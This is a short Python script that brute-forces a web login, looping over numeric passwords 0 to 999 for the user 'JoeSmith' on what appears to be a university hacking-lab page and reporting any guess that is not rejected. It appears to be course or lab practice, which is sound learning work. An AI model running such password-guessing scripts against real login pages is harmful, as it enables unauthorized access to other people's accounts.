import requests
link = requests.get("http://cueh.coventry.ac.uk/web_houses/titaniumhouse2/welcome.php?username=JoeSmith&password=")
print(link.text)

for x in range(1000):
	payload = {"username":"JoeSmith", "password":x}
	r = requests.get("http://cueh.coventry.ac.uk/web_houses/titaniumhouse2/welcome.php?username=JoeSmith&password=", params=payload)
	
	if "incorrect" not in r.text:
		print("password found {0}".format(x))
